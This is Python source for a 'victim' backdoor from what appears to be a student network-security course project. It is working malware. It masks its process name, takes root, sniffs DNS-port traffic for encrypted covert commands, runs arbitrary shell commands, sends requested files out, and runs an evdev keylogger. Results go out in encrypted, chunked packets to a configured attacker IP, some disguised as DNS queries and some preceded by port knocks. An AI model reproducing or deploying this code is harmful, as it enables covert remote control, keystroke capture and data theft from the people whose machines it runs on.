"""
Author: Braeden Nishikihama
Created: June 2023
COMP 8505 Final Project
Victim Program
"""
import time

import victim_config
from cryptography.fernet import Fernet, InvalidToken
from setproctitle import setproctitle
# from scapy.all import *
from scapy.sendrecv import sniff, send
from scapy.all import RandNum
from scapy.layers.inet import IP, UDP, TCP
from scapy.layers.dns import DNS, DNSQR
from watchdog.events import FileSystemEventHandler
from watchdog.observers import Observer
import evdev
import subprocess
import threading
import socket
import json
import os
from datetime import datetime

# Read symmetric encryption key
try:
    with open(victim_config.KEY, 'rb') as sym_key:
        key = sym_key.read()
    fernet = Fernet(key)
except FileNotFoundError:
    print("Encryption file could not be found. Exiting...")
    exit(0)


s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(("8.8.8.8", 80))
IP_SELF = s.getsockname()[0]
s.close()


class FileWatchHandler(FileSystemEventHandler):
    def __init__(self, file_path):
        self.file_path = file_path

    def on_created(self, event):
        time.sleep(1)
        event_path = os.path.abspath(event.src_path)
        event_file = event_path.split("/")[-1]
        file = self.file_path.split("/")[-1]

        print(os.path.abspath(event.src_path))
        print(os.path.abspath(self.file_path))
        try:
            # Check if file was placed in directory
            if not event.is_directory and event_file == file:
                # Runs every time the file is modified
                print(f"FILE CREATED {event.src_path}")
                with open(file, "rb") as f:
                    file_data = f.read()
                print(file_data)
                send_response(3, file_data.decode())
            # Check if it is a .part file in the process of being made
            elif not event.is_directory and event_file == file + ".part":
                print(f"File Created {event.src_path}")
                with open(victim_config.FILE_WATCH, "rb") as a:
                    file_data = a.read()
                print(file_data)
                send_response(3, file_data.decode())
        except FileNotFoundError:
            print(f"File Error: {event_path}")
            return


def encrypt(plaintext):
    try:
        # Encrypt using preloaded key
        encrypted_string = fernet.encrypt(plaintext)
        return encrypted_string
    except InvalidToken:
        print("Error while encrypting, invalid plaintext. Exiting...")
        exit(0)


def decrypt(encrypted_string):
    try:
        # Decrypt using preloaded key
        plaintext = fernet.decrypt(encrypted_string)
        return plaintext
    except InvalidToken:
        print("Error while decrypting, invalid plaintext. Exiting...")
        exit(0)


def file_watch():
    """Sets Monitoring of Files and Directories listed in config file"""
    path = victim_config.FILE_WATCH
    directory = os.path.dirname(path)

    if not directory:
        directory = "."
    if not path:
        return

    event_handler = FileWatchHandler(path)
    observer = Observer()
    observer.schedule(event_handler, path=directory, recursive=False)
    observer.start()


def keylogger():
    print("Starting keylogger")
    device = evdev.InputDevice(victim_config.KEYLOG_DEVICE)
    for event in device.read_loop():
        if event.type == evdev.ecodes.EV_KEY:
            key_event = evdev.categorize(event)
            if key_event.keystate == key_event.key_down:
                key = key_event.keycode.split("_")[1].lower()
                if key == "leftshift" or key == "rightshift" or \
                        key == "leftctrl" or key == "rightctrl" or \
                        key == "enter" or \
                        key == "backspace" or \
                        key == "tab":
                    key_result = " " + key + " "
                elif key == "space":
                    key_result = " "
                else:
                    key_result = key
                with open(victim_config.KEYLOG_FILE, "a") as f:
                    f.write(key_result)


def execute_command(command):
    """Executes a linux command"""
    result = subprocess.run(command, shell=True, capture_output=True)
    if result.stderr:
        print(f"Error in command: {command}.")
        output = result.stderr
    else:
        output = result.stdout
    send_response(0, output.decode())


def file_transfer(file):
    """Retrieves a file"""
    try:
        with open(file, "rb") as f:
            file_bytes = f.read()
        send_response(1, file_bytes.decode())
    except FileNotFoundError:
        send_response(1, "No File Found")


def request_keylog():
    """Retrieves keylog file data"""
    try:
        with open(victim_config.KEYLOG_FILE, "rb") as file:
            keylog_data = file.read()
        send_response(2, keylog_data.decode())
    except FileNotFoundError:
        send_response(2, "No File Found")
    pass


def craft_packet(message, port=victim_config.TARGET_PORT):
    try:
        pkt = IP(dst=victim_config.TARGET_IP)
        if victim_config.PROTOCOL["TCP"]:
            pkt = pkt / \
                  TCP(dport=port, sport=RandNum(5000, 65000)) / \
                  message
        elif victim_config.PROTOCOL["UDP"]:
            if port == 53:
                pkt = pkt / \
                      UDP(dport=port, sport=RandNum(5000, 65000)) / \
                      DNS(qd=DNSQR(qname="www.mozilla.org")) / \
                      message
            else:
                pkt = pkt / \
                      UDP(dport=port, sport=RandNum(5000, 65000)) / \
                      message

        return pkt
    except OSError:
        print("Invalid IP Address. Exiting...")
        exit(0)


def send_response(command_type, command_result):
    """Sends back packet(s) containing the result of the command executed"""
    payload_chunks = []

    return_result = victim_config.COMMAND_START + str(command_type) + command_result + victim_config.COMMAND_END
    encrypted_result = victim_config.IDENTIFIER + encrypt(return_result.encode())
    print(f"Total Bytes to Send: {len(encrypted_result)}")

    # Split up the encrypted payload if it exceeds MAX_PAYLOAD_SIZE
    for i in range(0, len(encrypted_result), victim_config.MAX_PAYLOAD_SIZE):
        payload_chunks.append(encrypted_result[i:i + victim_config.MAX_PAYLOAD_SIZE])

    print(f"Sending {len(payload_chunks)} Packets")
    if command_type == 1:
        send(IP(dst=victim_config.TARGET_IP) / UDP(dport=8505), verbose=False)
        print("First Port Knock Packet Sent")
        send(IP(dst=victim_config.TARGET_IP) / UDP(dport=8506), verbose=False)
        print("Second Port Knock Packet Sent")

    num_pkts = str(len(payload_chunks))
    control_pkt = IP(dst=victim_config.TARGET_IP) / \
                  TCP(dport=victim_config.TARGET_PORT, sport=RandNum(5000, 65000)) / \
                  num_pkts.encode()
    # control_pkt = craft_packet(num_pkts.encode())
    control_pkt["IP"].id = 0
    if command_type == 1:
        control_pkt["TCP"].dport = victim_config.PORT_KNOCK_TARGET_PORT
    send(control_pkt, verbose=False)

    for j in payload_chunks:
        if command_type == 1:
            pkt = craft_packet(j, victim_config.PORT_KNOCK_TARGET_PORT)
        else:
            pkt = craft_packet(j)
        send(pkt, verbose=False)


def pkt_handler(pkt):
    if not pkt.haslayer("IP"):
        return
    # print(socket.gethostbyname(socket.gethostname()))
    # Only look at packets with this machine as destination
    if pkt["IP"].src == IP_SELF:
        return
    if pkt["IP"].src == socket.gethostbyname(socket.gethostname()):
        return

    try:
        # If incoming DNS packet is UDP
        if pkt.haslayer("UDP"):
            # Get payload of packet
            payload = pkt["UDP"].load
        elif pkt.haslayer("TCP"):
            payload = pkt["TCP"].load
        else:
            return
    except AttributeError:
        return

    # Check if payload corrupted by finding identifier
    if payload[:len(victim_config.IDENTIFIER)] != victim_config.IDENTIFIER:
        return

    # Decrypt payload to get command
    payload = decrypt(payload[len(victim_config.IDENTIFIER):]).decode()
    # Check for payload integrity
    if victim_config.COMMAND_START not in payload:
        print("Packet Corrupted")
        return
    if victim_config.COMMAND_END not in payload:
        print("Packet Corrupted")
        return

    # Retrieve Command
    return_command = payload[len(victim_config.COMMAND_START):-len(victim_config.COMMAND_END)]
    command_type, command = int(return_command[:1]), return_command[1:]
    print(f"Received Command: {command}")

    # Execute Command by Type
    if command_type == 0:
        # Execute Linux Command
        execute_command(command)
    elif command_type == 1:
        # Execute File Transfer Command
        file_transfer(command)
    elif command_type == 2:
        # Request the keylog file
        request_keylog()
    else:
        return


def main():
    # Mask Process
    setproctitle(victim_config.PROCESS_TITLE)
    os.setuid(0)
    os.setgid(0)

    try:
        file_watch()
        threading.Thread(target=keylogger, daemon=True).start()
        sniff(filter=f"dst port 53", prn=pkt_handler, store=False)
    except KeyboardInterrupt:
        print("Exiting...")
        exit(0)


if __name__ == '__main__':
    main()
